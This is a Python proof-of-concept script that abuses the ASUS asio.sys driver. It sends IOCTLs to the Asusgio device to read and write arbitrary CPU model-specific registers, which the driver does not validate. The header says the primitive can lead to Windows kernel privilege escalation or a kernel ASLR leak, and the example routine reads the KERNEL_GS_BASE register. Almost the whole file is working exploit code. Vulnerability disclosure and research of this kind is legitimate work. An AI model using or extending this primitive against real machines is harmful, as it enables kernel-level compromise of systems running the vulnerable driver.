"""
	ASIO.SYS unsafe operation POC by 0x3d5157636b525761.
	====================================================
	This class can read and write MSRs freely by sending IOCTLs to asio.sys.
	That driver doesn't validate MSR numbers - which is very unsafe.
	In the right hands, this could become either Windows kernel privilege escalation
		or just Kernel ASLR info-leak.

	Long live my cat, Sushi!

		  \    /\
		   )  ( ')
		  (  /  )
		   \(__)|
"""
import ctypes
import struct
import sys

class AsusBug:
	"""
		Wrapper for ASUS driver IOCTLs.
	"""
	
	# Class members
	IOCTL_GET_CURRENT_CPU_FREQUENCY = 0xA040A464
	IOCTL_READ_MSR = 0xA0406458
	IOCTL_WRITE_MSR = 0xA040A45C
	
	def __init__(self):
		"""
			Initializes the instance.
		"""
		
		# Save members
		self.kernel32 = ctypes.windll.kernel32
		self.device = self.kernel32['CreateFileA']('\\\\.\\Asusgio', 0xC0000000, 3, 0, 3, 0, 0)
		
	def _invoke_ioctl(self, ioctl, in_buffer):
		"""
			Internally invokes an IOCTL.
		"""

		# Create output buffers and invoke API
		bytes_returned = ctypes.create_string_buffer(struct.calcsize('<L'))
		out_buffer = ctypes.create_string_buffer(struct.calcsize('<Q'))
		assert 0 != self.kernel32['DeviceIoControl'](self.device, ioctl, ctypes.byref(in_buffer), ctypes.sizeof(in_buffer), ctypes.byref(out_buffer), ctypes.sizeof(out_buffer), ctypes.byref(bytes_returned), 0)
		return struct.unpack('<Q', out_buffer.raw)[0]
		
	def get_current_cpu_frequency(self):
		"""
			Gets the current CPU frequency.
		"""
		
		# Invoke
		in_buffer = ctypes.create_string_buffer(struct.calcsize('<L'))
		return self._invoke_ioctl(self.__class__.IOCTL_GET_CURRENT_CPU_FREQUENCY, in_buffer)
		
	def read_msr(self, msr):
		"""
			Reads the given MSR.
		"""
		
		# Invoke
		in_buffer = ctypes.create_string_buffer(struct.calcsize('<L'))
		in_buffer.raw = struct.pack('<L', msr)
		return self._invoke_ioctl(self.__class__.IOCTL_READ_MSR, in_buffer)
		
	def write_msr(self, msr, value):
		"""
			Writes the given MSR.
		"""
		
		# Invoke
		in_buffer = ctypes.create_string_buffer(struct.calcsize('<LQ'))
		in_buffer.raw = struct.pack('<LQ', msr, value)
		return self._invoke_ioctl(self.__class__.IOCTL_WRITE_MSR, in_buffer)

def main():
	print 'Example:'
	asus = AsusBug()
	print '0x%.16X' % (asus.read_msr(0xC0000102),)

if __name__ == '__main__':
	main()
